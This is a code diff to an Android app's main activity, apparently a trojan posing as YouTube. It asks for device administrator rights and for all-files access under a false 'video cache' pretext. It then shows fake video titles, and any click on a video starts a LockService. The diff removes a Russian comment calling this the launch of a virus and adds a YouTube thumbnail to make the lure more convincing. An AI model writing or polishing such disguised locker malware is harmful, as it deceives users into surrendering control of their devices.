@@ -11,6 +11,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.Settings;
 import android.view.View;
+import android.widget.ImageView;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -22,8 +23,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         setContentView(R.layout.activity_main);
-        
-        // Сначала проверяем права (Админ и Файлы)
         checkPermissions();
     }
 
@@ -37,7 +36,6 @@ public class MainActivity extends Activity {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
 
-        // 1. Запрос прав Админа
         if (!dpm.isAdminActive(adminComponent)) {
             Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
@@ -46,20 +44,18 @@ public class MainActivity extends Activity {
             return;
         }
 
-        // 2. Запрос прав на файлы
         if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
             Toast.makeText(this, "Нужен доступ к памяти для кэша видео", Toast.LENGTH_LONG).show();
             startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
             return;
         }
 
-        // 3. Если всё разрешено — показываем YouTube
         generateVideos();
     }
 
     private void generateVideos() {
         LinearLayout list = findViewById(R.id.videoList);
-        list.removeAllViews(); // Очищаем, чтобы не дублировалось
+        list.removeAllViews(); 
 
         String[] titles = {
             "Как взломать Пентагон за 5 минут",
@@ -79,8 +75,9 @@ public class MainActivity extends Activity {
             videoView.setOrientation(LinearLayout.VERTICAL);
             videoView.setPadding(15, 15, 15, 15);
             
-            View thumb = new View(this);
-            thumb.setBackgroundColor(0xFF212121); 
+            ImageView thumb = new ImageView(this);
+            thumb.setImageResource(R.drawable.yt_thumb); 
+            thumb.setScaleType(ImageView.ScaleType.CENTER_CROP);
             LinearLayout.LayoutParams thumbParams = new LinearLayout.LayoutParams(
                     LinearLayout.LayoutParams.MATCH_PARENT, 400);
             thumb.setLayoutParams(thumbParams);
@@ -102,7 +99,6 @@ public class MainActivity extends Activity {
             videoView.setOnClickListener(new View.OnClickListener() {
                 @Override
                 public void onClick(View v) {
-                    // Запуск вируса при клике на видео
                     startService(new Intent(MainActivity.this, LockService.class));
                     finish();
                 }
@@ -119,4 +115,4 @@ public class MainActivity extends Activity {
             checkPermissions();
         }
     }
-}
+                               }
